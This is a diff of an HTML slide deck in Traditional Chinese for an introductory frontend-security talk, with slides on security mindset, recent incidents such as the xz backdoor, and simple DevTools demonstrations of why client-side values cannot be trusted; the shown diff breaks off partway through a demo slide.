@@ -1,79 +1,110 @@
-<!doctype html>
+<!DOCTYPE html>
+
 <html lang="zh-TW">
-<head>
+  <head>
     <!-- 基本設定 -->
-    <meta charset="utf-8">
+
+    <meta charset="utf-8" />
+
     <title>前端安全入門講座 - 給 Vibe Coding 的你</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
 
     <!-- 核心資源預加載：提升頁面載入效能 -->
-    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.3.1/reveal.min.css" as="style" crossorigin>
-    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.3.1/theme/black.min.css" as="style" crossorigin>
-    <link rel="preload" href="styles.css" as="style" crossorigin>
-    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.3.1/reveal.min.js" as="script" crossorigin>
-    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.2/gsap.min.js" as="script" crossorigin>
-    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/p5.js/1.7.0/p5.min.js" as="script" crossorigin="anonymous">
+
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.3.1/reveal.min.css" as="style" crossorigin />
+
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.3.1/theme/black.min.css" as="style" crossorigin />
+
+    <link rel="preload" href="styles.css" as="style" crossorigin />
+
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.3.1/reveal.min.js" as="script" crossorigin />
+
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.2/gsap.min.js" as="script" crossorigin />
+
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/p5.js/1.7.0/p5.min.js" as="script" crossorigin="anonymous" />
 
     <!-- 引入 jQuery：用於 DOM 操作和事件處理 -->
+
     <script src="https://code.jquery.com/jquery-3.7.1.min.js" integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo=" crossorigin="anonymous"></script>
 
     <!-- 引入 Google Fonts：提供多種中英文字體 -->
-    <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+TC:wght@400;500;700&family=Noto+Serif+TC:wght@400;700&family=Zen+Maru+Gothic:wght@400;700&family=Zen+Old+Mincho:wght@400;700&family=Klee+One:wght@400;600&family=Dela+Gothic+One&family=Yusei+Magic&family=DotGothic16&family=IBM+Plex+Sans+JP:wght@400;700&display=swap" rel="stylesheet">
+
+    <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+TC:wght@400;500;700&family=Noto+Serif+TC:wght@400;700&family=Zen+Maru+Gothic:wght@400;700&family=Zen+Old+Mincho:wght@400;700&family=Klee+One:wght@400;600&family=Dela+Gothic+One&family=Yusei+Magic&family=DotGothic16&family=IBM+Plex+Sans+JP:wght@400;700&display=swap" rel="stylesheet" />
 
     <!-- 核心 CSS：引入必要的樣式表 -->
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.3.1/reveal.min.css" crossorigin>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.3.1/theme/black.min.css" id="theme" crossorigin>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" crossorigin>
-    <link rel="stylesheet" href="styles.css" crossorigin>
-</head>
-<body>
 
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.3.1/reveal.min.css" crossorigin />
+
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.3.1/theme/black.min.css" id="theme" crossorigin />
+
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" crossorigin />
+
+    <link rel="stylesheet" href="styles.css" crossorigin />
+  </head>
+
+  <body>
     <!-- Reveal.js 幻燈片容器 -->
+
     <div class="reveal">
-        <div class="slides">
+      <div class="slides">
+        <!-- Slide 0：封面 -->
 
-            <!-- Slide 0：封面 -->
-            <section>
-                <div class="content-wrapper">
-                    <h1 style="font-size: 3rem; margin-bottom: 1rem; color: var(--primary-blue);">前端安全入門</h1>
-                    <p style="font-size: 1.6rem; margin-bottom: 2rem; color: var(--text-secondary);">給 Vibe Coding 的你</p>
-                    <div style="margin-top: 2.5rem;">
-                        <p style="font-size: 1.2rem; margin-bottom: 0.5rem;">講者：CabLate</p>
-                        <p style="font-size: 0.9rem; color: var(--text-tertiary);">2025 年資安基礎講座</p>
-                    </div>
-                </div>
-            </section>
+        <section>
+          <div class="content-wrapper">
+            <h1 style="font-size: 3rem; margin-bottom: 1rem; color: var(--primary-blue)">前端安全入門</h1>
 
-            <!-- Slide 0.5：講師自我介紹 -->
-            <section>
-                <div class="content-wrapper">
-                    <div style="display: flex; align-items: center; justify-content: center; gap: 2rem; margin-top: 2rem;">
-                        <img src="Image/CabLabPicture.png" alt="講師照片" style="width: 150px; height: 150px; border-radius: 50%; object-fit: cover;">
-                        <div style="text-align: left;">
-                            <h2 style="color: var(--primary-blue); margin-bottom: 1rem;">CabLate</h2>
-                            <p class="text-medium">• 全端工程師，多年 AI 協作與 AI 應用開發經驗</p>
-                        </div>
-                    </div>
-                </div>
-            </section>
+            <p style="font-size: 1.6rem; margin-bottom: 2rem; color: var(--text-secondary)">給 Vibe Coding 的你</p>
 
-            <!-- Slide 1：議程 -->
-            <section>
-                <div class="content-wrapper">
-                    <h2 style="font-size: 2.2rem; margin-bottom: 1.5rem; color: var(--primary-blue);">今日議程</h2>
-                    <div class="course-topics-container">
-                        <app-card title="開場與目標" description="5 分鐘<br>為什麼資安與你有關"></app-card>
-                        <app-card title="DevTool 實戰演示" description="7 分鐘<br>網頁的透視眼鏡 / 三個攻擊場景"></app-card>
-                        <app-card title="前端安全深講" description="25 分鐘<br>XSS / CSRF / 第三方腳本"></app-card>
-                        <app-card title="Token 安全機制" description="8 分鐘<br>通行證比喻"></app-card>
-                        <app-card title="架構與實務" description="8 分鐘<br>三層架構 / 誤區"></app-card>
-                        <app-card title="CTA 與 Q&A" description="7 分鐘<br>服務介紹 / 問答"></app-card>
-                    </div>
-                </div>
-            </section>
+            <div style="margin-top: 2.5rem">
+              <p style="font-size: 1.2rem; margin-bottom: 0.5rem">講者：CabLate</p>
 
-            <!-- Slide 1.5：資安的本質 -->
-            <section>
+              <p style="font-size: 0.9rem; color: var(--text-tertiary)">2025 年資安基礎講座</p>
+            </div>
+          </div>
+        </section>
+
+        <!-- Slide 0.5：講師自我介紹 -->
+
+        <section>
+          <div class="content-wrapper">
+            <div style="display: flex; align-items: center; justify-content: center; gap: 2rem; margin-top: 2rem">
+              <img src="Image/CabLabPicture.png" alt="講師照片" style="width: 150px; height: 150px; border-radius: 50%; object-fit: cover" />
+
+              <div style="text-align: left">
+                <h2 style="color: var(--primary-blue); margin-bottom: 1rem">CabLate</h2>
+
+                <p class="text-medium">• 全端工程師，多年 AI 協作與 AI 應用開發經驗</p>
+              </div>
+            </div>
+          </div>
+        </section>
+
+        <!-- Slide 1：議程 -->
+
+        <section>
+          <div class="content-wrapper">
+            <h2 style="font-size: 2.2rem; margin-bottom: 1.5rem; color: var(--primary-blue)">今日議程</h2>
+
+            <div class="course-topics-container">
+              <app-card title="開場與目標" description="5 分鐘<br>為什麼資安與你有關"></app-card>
+
+              <app-card title="DevTool 實戰演示" description="7 分鐘<br>網頁的透視眼鏡 / 三個攻擊場景"></app-card>
+
+              <app-card title="前端安全深講" description="25 分鐘<br>XSS / CSRF / 第三方腳本"></app-card>
+
+              <app-card title="Token 安全機制" description="8 分鐘<br>通行證比喻"></app-card>
+
+              <app-card title="架構與實務" description="8 分鐘<br>三層架構 / 誤區"></app-card>
+
+              <app-card title="CTA 與 Q&A" description="7 分鐘<br>服務介紹 / 問答"></app-card>
+            </div>
+          </div>
+        </section>
+
+        <!-- Slide 1.5：資安的本質 -->
+
+            <section id="security-essence">
                 <div class="content-wrapper">
                     <h2 style="font-size: 2.2rem; margin-bottom: 1rem; color: var(--primary-blue);">資安的本質是什麼？</h2>
                     <p style="font-size: 1rem; margin-bottom: 1.2rem; color: var(--text-secondary);">在學技術之前，先建立正確心態</p>
@@ -81,28 +112,28 @@
                         <!-- 核心觀念網格 -->
                         <div style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 1rem; margin-bottom: 1.2rem;">
                             <!-- 觀念 1 -->
-                            <div style="background: rgba(0,122,255,0.08); padding: 1.2rem; border-radius: var(--radius-medium); border-left: 4px solid var(--primary-blue);">
+                            <div class="fragment" style="background: rgba(0,122,255,0.08); padding: 1.2rem; border-radius: var(--radius-medium); border-left: 4px solid var(--primary-blue);">
                                 <h3 style="color: var(--primary-blue); font-size: 1.1rem; margin-bottom: 0.6rem;">🎯 提高攻擊成本</h3>
                                 <p style="font-size: 0.85rem; line-height: 1.4; color: #666; margin-bottom: 0.4rem;">不是絕對防禦</p>
                                 <p style="font-size: 0.9rem; line-height: 1.4; font-weight: 600;">鎖門不是擋小偷，而是讓小偷覺得不好偷</p>
                             </div>
 
                             <!-- 觀念 2 -->
-                            <div style="background: rgba(255,149,0,0.08); padding: 1.2rem; border-radius: var(--radius-medium); border-left: 4px solid #ff9500;">
+                            <div class="fragment" style="background: rgba(255,149,0,0.08); padding: 1.2rem; border-radius: var(--radius-medium); border-left: 4px solid #ff9500;">
                                 <h3 style="color: #ff9500; font-size: 1.1rem; margin-bottom: 0.6rem;">🎣 攻擊者廣撒網</h3>
                                 <p style="font-size: 0.85rem; line-height: 1.4; color: #666; margin-bottom: 0.4rem;">不是針對你</p>
                                 <p style="font-size: 0.9rem; line-height: 1.4; font-weight: 600;">像釣魚，只要 0.1% 上鉤就有利潤</p>
                             </div>
 
                             <!-- 觀念 3 -->
-                            <div style="background: rgba(52,199,89,0.08); padding: 1.2rem; border-radius: var(--radius-medium); border-left: 4px solid #34c759;">
+                            <div class="fragment" style="background: rgba(52,199,89,0.08); padding: 1.2rem; border-radius: var(--radius-medium); border-left: 4px solid #34c759;">
                                 <h3 style="color: #34c759; font-size: 1.1rem; margin-bottom: 0.6rem;">🛡️ 分層防護</h3>
                                 <p style="font-size: 0.85rem; line-height: 1.4; color: #666; margin-bottom: 0.4rem;">沒有一次到位</p>
                                 <p style="font-size: 0.9rem; line-height: 1.4; font-weight: 600;">防火牆、警衛、門鎖、監視器，缺一不可</p>
                             </div>
 
                             <!-- 觀念 4 -->
-                            <div style="background: rgba(255,59,48,0.08); padding: 1.2rem; border-radius: var(--radius-medium); border-left: 4px solid #ff3b30;">
+                            <div class="fragment" style="background: rgba(255,59,48,0.08); padding: 1.2rem; border-radius: var(--radius-medium); border-left: 4px solid #ff3b30;">
                                 <h3 style="color: #ff3b30; font-size: 1.1rem; margin-bottom: 0.6rem;">👤 最弱的是人</h3>
                                 <p style="font-size: 0.85rem; line-height: 1.4; color: #666; margin-bottom: 0.4rem;">系統再安全也沒用</p>
                                 <p style="font-size: 0.9rem; line-height: 1.4; font-weight: 600;">防盜門再厚，防不住自己開門</p>
@@ -110,7 +141,7 @@
                         </div>
 
                         <!-- 核心公式 -->
-                        <div style="background: linear-gradient(135deg, rgba(0,122,255,0.1) 0%, rgba(52,199,89,0.1) 100%); padding: 1.5rem; border-radius: var(--radius-large); border: 2px solid rgba(0,122,255,0.3); text-align: center;">
+                        <div class="fragment" style="background: linear-gradient(135deg, rgba(0,122,255,0.1) 0%, rgba(52,199,89,0.1) 100%); padding: 1.5rem; border-radius: var(--radius-large); border: 2px solid rgba(0,122,255,0.3); text-align: center;">
                             <p style="font-size: 1.4rem; font-weight: 700; color: var(--primary-blue); margin-bottom: 0.7rem;">
                                 資安 = 預防 + 偵測 + 反應 + 恢復
                             </p>
@@ -122,1063 +153,1386 @@
                 </div>
             </section>
 
-            <!-- Slide 2：開場故事 -->
-            <section>
-                <div class="content-wrapper">
-                    <h2 style="font-size: 2rem; margin-bottom: 0.9rem; color: var(--primary-blue);">為什麼在意資安？</h2>
-                    <div style="max-width: 850px; margin: 0 auto;">
-                        <!-- 案例網格 -->
-                        <div style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 0.8rem; margin-bottom: 0.9rem;">
-                            <!-- 案例 1：XSS 相關 -->
-                            <div style="background: rgba(255,59,48,0.1); padding: 1rem; border-radius: var(--radius-medium); border: 2px solid rgba(255,59,48,0.3);">
-                                <h3 style="color: #ff3b30; margin-bottom: 0.5rem; font-size: 1rem;">🦠 留言板被植入惡意腳本</h3>
-                                <p style="font-size: 0.85rem; line-height: 1.4; margin-bottom: 0.3rem;">→ 使用者點擊假優惠按鈕</p>
-                                <p style="font-size: 1rem; line-height: 1.4; color: #ff3b30; font-weight: 700;">→ 3 萬帳號被盜</p>
-                                <p style="font-size: 0.85rem; line-height: 1.4;">→ 客訴爆炸、品牌重創</p>
-                            </div>
+        <!-- Slide 1.8：真實案例快訊 -->
 
-                            <!-- 案例 2：CSRF 相關 -->
-                            <div style="background: rgba(255,149,0,0.1); padding: 1rem; border-radius: var(--radius-medium); border: 2px solid rgba(255,149,0,0.3);">
-                                <h3 style="color: #ff9500; margin-bottom: 0.5rem; font-size: 1rem;">🎭 跨站請求偽造攻擊</h3>
-                                <p style="font-size: 0.85rem; line-height: 1.4; margin-bottom: 0.3rem;">→ 使用者在其他分頁被偷轉帳</p>
-                                <p style="font-size: 1rem; line-height: 1.4; color: #ff9500; font-weight: 700;">→ 單日損失 500 萬</p>
-                            </div>
+        <section>
+          <div class="content-wrapper">
+            <h2 style="font-size: 2rem; margin-bottom: 1rem; color: var(--primary-blue)">真實案例快訊</h2>
 
-                            <!-- 案例 3：前端竄改 -->
-                            <div style="background: rgba(175,82,222,0.1); padding: 1rem; border-radius: var(--radius-medium); border: 2px solid rgba(175,82,222,0.3);">
-                                <h3 style="color: #af52de; margin-bottom: 0.5rem; font-size: 1rem;">😈 前端價格被竄改</h3>
-                                <p style="font-size: 0.85rem; line-height: 1.4; margin-bottom: 0.3rem;">→ 後端未驗證直接接受</p>
-                                <p style="font-size: 1rem; line-height: 1.4; color: #af52de; font-weight: 700;">→ $1 買到高價商品</p>
-                                <p style="font-size: 0.85rem; line-height: 1.4;">→ 一夜損失 200 萬營收</p>
-                            </div>
+            <p style="font-size: 1rem; margin-bottom: 1.2rem; color: var(--text-secondary)">這一年間被攻擊的不是別人，是真實產品與團隊的血淚。</p>
 
-                            <!-- 案例 4：Token/密碼外洩 -->
-                            <div style="background: rgba(255,45,85,0.1); padding: 1rem; border-radius: var(--radius-medium); border: 2px solid rgba(255,45,85,0.3);">
-                                <h3 style="color: #ff2d55; margin-bottom: 0.5rem; font-size: 1rem;">🔐 明碼密碼外洩</h3>
-                                <p style="font-size: 0.85rem; line-height: 1.4; margin-bottom: 0.3rem;">→ 資料庫被駭、密碼全曝光</p>
-                                <p style="font-size: 1rem; line-height: 1.4; color: #ff2d55; font-weight: 700;">→ 個資法罰款 2,000 萬</p>
-                                <p style="font-size: 0.85rem; line-height: 1.4;">→ 使用者集體求償</p>
-                            </div>
-                        </div>
-                    </div>
+            <div style="display: grid; gap: 1rem; grid-template-columns: repeat(auto-fit, minmax(260px, 1fr)); max-width: 900px; margin: 0 auto">
+              <div class="fragment" style="background: rgba(255, 59, 48, 0.08); border-radius: var(--radius-medium); border: 2px solid rgba(255, 59, 48, 0.25); padding: 1.1rem">
+                <div style="font-size: 1.4rem; margin-bottom: 0.4rem">⚠️</div>
+
+                <h3 style="font-size: 1.05rem; color: #ff3b30; margin-bottom: 0.4rem">CVE-2024-44308：Safari 零時差攻擊</h3>
+
+                <p style="font-size: 0.9rem; line-height: 1.45; color: var(--text-primary)">針對 WebKit 的惡意網頁可執行任意程式碼，Apple 確認此弱點已在 Intel 架構的 Mac 上遭利用，並於 2024-11-21 推出 Safari 18.1.1、iOS/iPadOS 17.7.2、18.1.1 及 macOS Sequoia 15.1.1 修補。</p>
+
+                <p style="font-size: 0.8rem; line-height: 1.35; color: var(--text-secondary)">→ 不更新的裝置，等同讓攻擊者遠端開門。</p>
+              </div>
+
+              <div class="fragment" style="background: rgba(255, 149, 0, 0.08); border-radius: var(--radius-medium); border: 2px solid rgba(255, 149, 0, 0.25); padding: 1.1rem">
+                <div style="font-size: 1.4rem; margin-bottom: 0.4rem">🧪</div>
+
+                <h3 style="font-size: 1.05rem; color: #ff9500; margin-bottom: 0.4rem">xz Utils Backdoor（CVE-2024-3094）</h3>
+
+                <p style="font-size: 0.9rem; line-height: 1.45; color: var(--text-primary)">攻擊者長期以「熱心維護者」身分提交 PR、要求掌控發佈流程，最終將惡意壓縮程式碼塞進正式版本，使得 OpenSSH 等服務在連線時可能被植入後門。</p>
+
+                <p style="font-size: 0.8rem; line-height: 1.35; color: var(--text-secondary)">→ PR 沒有審查與二人制，供應鏈就被拿走鑰匙。</p>
+              </div>
+
+              <div class="fragment" style="background: rgba(0, 122, 255, 0.08); border-radius: var(--radius-medium); border: 2px solid rgba(0, 122, 255, 0.25); padding: 1.1rem">
+                <div style="font-size: 1.4rem; margin-bottom: 0.4rem">🔑</div>
+
+                <h3 style="font-size: 1.05rem; color: var(--primary-blue); margin-bottom: 0.4rem">密鑰外洩：GitHub 公開庫的日常</h3>
+
+                <p style="font-size: 0.9rem; line-height: 1.45; color: var(--text-primary)">GitGuardian《State of Secrets Sprawl 2024》統計，僅 2023 年就在 GitHub 公開庫偵測到 1,280 萬筆秘密金鑰（含 AWS Key、API Token），其中多起被自動化掃描工具立即濫用。</p>
+
+                <p style="font-size: 0.8rem; line-height: 1.35; color: var(--text-secondary)">→ commit 前沒檢查，就等於把雲端帳單與客戶資料送人。</p>
+              </div>
+            </div>
+          </div>
+        </section>
+
+        <!-- Slide 2：開場故事 -->
+
+        <section>
+          <div class="content-wrapper">
+            <h2 style="font-size: 2rem; margin-bottom: 0.9rem; color: var(--primary-blue)">為什麼在意資安？</h2>
+
+            <div style="max-width: 850px; margin: 0 auto">
+              <!-- 案例網格 -->
+
+              <div style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 0.8rem; margin-bottom: 0.9rem">
+                <!-- 案例 1：XSS 相關 -->
+
+                <div style="background: rgba(255, 59, 48, 0.1); padding: 1rem; border-radius: var(--radius-medium); border: 2px solid rgba(255, 59, 48, 0.3)">
+                  <h3 style="color: #ff3b30; margin-bottom: 0.5rem; font-size: 1rem">🦠 留言板被植入惡意腳本</h3>
+
+                  <p style="font-size: 0.85rem; line-height: 1.4; margin-bottom: 0.3rem">→ 使用者點擊假優惠按鈕</p>
+
+                  <p style="font-size: 1rem; line-height: 1.4; color: #ff3b30; font-weight: 700">→ 3 萬帳號被盜</p>
+
+                  <p style="font-size: 0.85rem; line-height: 1.4">→ 客訴爆炸、品牌重創</p>
                 </div>
-            </section>
 
-            <!-- Slide 3：DevTool 是什麼？網頁的透視眼鏡 -->
-            <section>
-                <div class="content-wrapper">
-                    <h2 style="font-size: 2.2rem; margin-bottom: 0.8rem; color: var(--primary-blue);">DevTool 是什麼？</h2>
-                    <p style="font-size: 1.1rem; margin-bottom: 1.2rem; color: var(--text-secondary);">任何人都能打開</p>
-                    <div style="max-width: 800px; margin: 0 auto;">
-                        <!-- 如何開啟 -->
-                        <div style="background: rgba(0,122,255,0.1); padding: 1.5rem; border-radius: var(--radius-medium); margin-bottom: 1.2rem; border: 2px solid rgba(0,122,255,0.3);">
-                            <h3 style="color: var(--primary-blue); font-size: 1.3rem; margin-bottom: 0.8rem; text-align: center;">🔧 如何開啟</h3>
-                            <div style="display: grid; grid-template-columns: repeat(3, 1fr); gap: 1rem; text-align: center;">
-                                <div>
-                                    <div style="font-size: 2.5rem; margin-bottom: 0.3rem;">⌨️</div>
-                                    <p style="font-size: 0.9rem; font-weight: 600;">按 F12</p>
-                                </div>
-                                <div>
-                                    <div style="font-size: 2.5rem; margin-bottom: 0.3rem;">🖱️</div>
-                                    <p style="font-size: 0.9rem; font-weight: 600;">右鍵 → 檢查</p>
-                                </div>
-                                <div>
-                                    <div style="font-size: 2.5rem; margin-bottom: 0.3rem;">⌘</div>
-                                    <p style="font-size: 0.9rem; font-weight: 600;">Mac: Cmd+Option+I</p>
-                                </div>
-                            </div>
-                        </div>
+                <!-- 案例 2：CSRF 相關 -->
 
-                        <!-- 關鍵訊息 -->
-                        <div style="background: rgba(255,59,48,0.1); padding: 1.5rem; border-radius: var(--radius-medium); border: 2px solid rgba(255,59,48,0.3);">
-                            <h3 style="color: #ff3b30; font-size: 1.3rem; margin-bottom: 0.8rem; text-align: center;">⚠️ 關鍵重點</h3>
-                            <p style="font-size: 1.1rem; line-height: 1.6; text-align: center; font-weight: 600;">
-                                你看得到的畫面，攻擊者也看得到<br>
-                                <span style="color: #ff3b30;">甚至能改！</span>
-                            </p>
-                        </div>
-                    </div>
+                <div style="background: rgba(255, 149, 0, 0.1); padding: 1rem; border-radius: var(--radius-medium); border: 2px solid rgba(255, 149, 0, 0.3)">
+                  <h3 style="color: #ff9500; margin-bottom: 0.5rem; font-size: 1rem">🎭 跨站請求偽造攻擊</h3>
+
+                  <p style="font-size: 0.85rem; line-height: 1.4; margin-bottom: 0.3rem">→ 使用者在其他分頁被偷轉帳</p>
+
+                  <p style="font-size: 1rem; line-height: 1.4; color: #ff9500; font-weight: 700">→ 單日損失 500 萬</p>
                 </div>
-            </section>
 
-            <!-- Slide 4：DevTool 實戰演示 -->
-            <section>
-                <div class="content-wrapper">
-                    <h2 style="font-size: 2.2rem; margin-bottom: 0.8rem; color: var(--primary-blue);">DevTool 實戰演示</h2>
-                    <p style="font-size: 1rem; margin-bottom: 1.2rem; color: var(--text-secondary);">三個任何人都能做的「攻擊」</p>
-                    <div style="max-width: 800px; margin: 0 auto;">
-                        <div style="display: flex; flex-direction: column; gap: 1rem;">
-                            <!-- 場景 1 -->
-                            <div style="background: rgba(255,59,48,0.1); padding: 1.2rem; border-radius: var(--radius-medium); border-left: 4px solid #ff3b30;">
-                                <h3 style="color: #ff3b30; font-size: 1.2rem; margin-bottom: 0.6rem;">💰 場景 1: 改價格</h3>
-                                <p style="font-size: 0.95rem; line-height: 1.5;">
-                                    Elements → 找到價格欄位 → Edit as HTML → 改成 $1<br>
-                                    <span style="color: #666;">→ 畫面上的 $1,999 變成 $1（但後端不會接受）</span>
-                                </p>
-                            </div>
+                <!-- 案例 3：前端竄改 -->
 
-                            <!-- 場景 2 -->
-                            <div style="background: rgba(255,149,0,0.1); padding: 1.2rem; border-radius: var(--radius-medium); border-left: 4px solid #ff9500;">
-                                <h3 style="color: #ff9500; font-size: 1.2rem; margin-bottom: 0.6rem;">🔓 場景 2: 挖出隱藏功能</h3>
-                                <p style="font-size: 0.95rem; line-height: 1.5;">
-                                    Elements → 搜尋 "hidden" → 刪除 display:none<br>
-                                    <span style="color: #666;">→ 原本隱藏的「管理員按鈕」出現了</span>
-                                </p>
-                            </div>
+                <div style="background: rgba(175, 82, 222, 0.1); padding: 1rem; border-radius: var(--radius-medium); border: 2px solid rgba(175, 82, 222, 0.3)">
+                  <h3 style="color: #af52de; margin-bottom: 0.5rem; font-size: 1rem">😈 前端價格被竄改</h3>
 
-                            <!-- 場景 3 -->
-                            <div style="background: rgba(175,82,222,0.1); padding: 1.2rem; border-radius: var(--radius-medium); border-left: 4px solid #af52de;">
-                                <h3 style="color: #af52de; font-size: 1.2rem; margin-bottom: 0.6rem;">🎫 場景 3: 看到 Token</h3>
-                                <p style="font-size: 0.95rem; line-height: 1.5;">
-                                    Application → Cookies → 找到 "token"<br>
-                                    <span style="color: #666;">→ 如果沒設定 HttpOnly，Token 就可以被看光光</span>
-                                </p>
-                            </div>
-                        </div>
+                  <p style="font-size: 0.85rem; line-height: 1.4; margin-bottom: 0.3rem">→ 後端未驗證直接接受</p>
 
-                        <!-- 總結 -->
-                        <div style="background: rgba(52,199,89,0.1); padding: 1.2rem; border-radius: var(--radius-medium); border: 2px solid rgba(52,199,89,0.3); margin-top: 1.2rem;">
-                            <p style="font-size: 1.1rem; font-weight: 600; color: #34c759; text-align: center;">
-                                💡 這就是為什麼「前端不可信」
-                            </p>
-                        </div>
-                    </div>
+                  <p style="font-size: 1rem; line-height: 1.4; color: #af52de; font-weight: 700">→ $1 買到高價商品</p>
+
+                  <p style="font-size: 0.85rem; line-height: 1.4">→ 一夜損失 200 萬營收</p>
                 </div>
-            </section>
 
-            <!-- Slide 5：前端不可信核心概念 -->
-            <section>
-                <div class="content-wrapper">
-                    <h2 style="font-size: 2.4rem; margin-bottom: 1.5rem; color: var(--primary-blue);">為什麼「前端不可信」？</h2>
-                    <div style="max-width: 700px; margin: 0 auto;">
-                        <div style="background: rgba(255,149,0,0.1); padding: 2rem; border-radius: var(--radius-large); margin-bottom: 1.5rem; border: 2px solid rgba(255,149,0,0.4);">
-                            <p style="font-size: 1.2rem; line-height: 1.6; margin-bottom: 1rem;">
-                                前端執行在<span style="color: #ff9500; font-weight: 700;">使用者端</span>
-                            </p>
-                            <p style="font-size: 1.2rem; line-height: 1.6; margin-bottom: 1rem;">
-                                → 使用者可修改 DOM / JS
-                            </p>
-                            <p style="font-size: 1.2rem; line-height: 1.6;">
-                                → 可傳輸任意數值給後端
-                            </p>
-                        </div>
-                        <div style="background: var(--background-tertiary); padding: 1.8rem; border-radius: var(--radius-large);">
-                            <h3 style="font-size: 1.4rem; color: var(--primary-blue); margin-bottom: 1rem;">核心口訣</h3>
-                            <p style="font-size: 1.2rem; line-height: 1.6; font-weight: 600;">
-                                前端只負責 UI 展示<br>
-                                後端才擁有功能存取的最終決定權
-                            </p>
-                        </div>
-                    </div>
+                <!-- 案例 4：Token/密碼外洩 -->
+
+                <div style="background: rgba(255, 45, 85, 0.1); padding: 1rem; border-radius: var(--radius-medium); border: 2px solid rgba(255, 45, 85, 0.3)">
+                  <h3 style="color: #ff2d55; margin-bottom: 0.5rem; font-size: 1rem">🔐 明碼密碼外洩</h3>
+
+                  <p style="font-size: 0.85rem; line-height: 1.4; margin-bottom: 0.3rem">→ 資料庫被駭、密碼全曝光</p>
+
+                  <p style="font-size: 1rem; line-height: 1.4; color: #ff2d55; font-weight: 700">→ 個資法罰款 2,000 萬</p>
+
+                  <p style="font-size: 0.85rem; line-height: 1.4">→ 使用者集體求償</p>
                 </div>
-            </section>
+              </div>
+            </div>
+          </div>
+        </section>
 
-            <!-- Slide 6：前端不可信互動演示 -->
-            <section>
-                <div class="content-wrapper">
-                    <h2 style="font-size: 1.9rem; margin-bottom: 0.7rem; color: var(--primary-blue);">前端不可信演示</h2>
-                    <div style="max-width: 850px; margin: 0 auto;">
-                        <!-- 商品卡片 + 互動輸入 -->
-                        <div style="background: white; border: 2px solid var(--border-color); border-radius: var(--radius-large); padding: 1rem; margin-bottom: 0.7rem;">
-                            <div style="display: flex; gap: 1rem; align-items: center;">
-                                <div style="width: 80px; height: 80px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); border-radius: var(--radius-medium);"></div>
-                                <div style="flex: 1; text-align: left;">
-                                    <h3 style="font-size: 1.1rem; margin-bottom: 0.4rem; color: #333;">精美產品</h3>
-                                    <div style="display: flex; align-items: center; gap: 0.6rem; margin-bottom: 0.5rem;">
-                                        <span style="font-size: 0.9rem; color: #666;">原價：</span>
-                                        <span style="font-size: 1.5rem; font-weight: 700; color: #333;" id="originalPrice">$1,999</span>
-                                    </div>
-                                    <div style="display: flex; align-items: center; gap: 0.6rem; margin-bottom: 0.5rem;">
-                                        <label style="font-size: 0.9rem; color: #666;">修改價格：</label>
-                                        <input type="number" id="hackPrice" value="1"
-                                            style="padding: 0.3rem 0.6rem; border: 2px solid #ff3b30; border-radius: 6px; font-size: 0.9rem; width: 80px;"
-                                            placeholder="輸入價格">
-                                    </div>
-                                    <button id="addToCartBtn"
-                                        style="padding: 0.4rem 1rem; background: var(--primary-blue); color: white; border: none; border-radius: 6px; cursor: pointer; font-size: 0.9rem; font-weight: 600;">
-                                        加入購物車
-                                    </button>
-                                </div>
-                            </div>
-                        </div>
+        <!-- Slide 3：DevTool 是什麼？網頁的透視眼鏡 -->
 
-                        <!-- 攻擊流程圖 -->
-                        <div style="display: flex; align-items: center; justify-content: space-between; gap: 0.5rem; margin-bottom: 0.7rem;">
-                            <div style="flex: 1; background: rgba(255,59,48,0.1); padding: 0.6rem; border-radius: 6px; border: 2px solid #ff3b30; text-align: center;">
-                                <div style="font-size: 1.2rem; margin-bottom: 0.2rem;">😈</div>
-                                <p style="font-size: 0.65rem; font-weight: 600; color: #ff3b30;">前端竄改<br>price: $1</p>
-                            </div>
-                            <div style="font-size: 1.2rem; color: #ff3b30;">→</div>
-                            <div style="flex: 1; background: rgba(175,82,222,0.1); padding: 0.6rem; border-radius: 6px; border: 2px solid #af52de; text-align: center;">
-                                <div style="font-size: 1.2rem; margin-bottom: 0.2rem;">📡</div>
-                                <p style="font-size: 0.65rem; font-weight: 600; color: #af52de;">發送請求<br>POST /cart</p>
-                            </div>
-                            <div style="font-size: 1.2rem; color: #ff3b30;">→</div>
-                            <div style="flex: 1; background: rgba(255,149,0,0.1); padding: 0.6rem; border-radius: 6px; border: 2px solid #ff9500; text-align: center;">
-                                <div style="font-size: 1.2rem; margin-bottom: 0.2rem;">💾</div>
-                                <p style="font-size: 0.65rem; font-weight: 600; color: #ff9500;">後端直接接受<br>建立購物車</p>
-                            </div>
-                            <div style="font-size: 1.2rem; color: #34c759;">→</div>
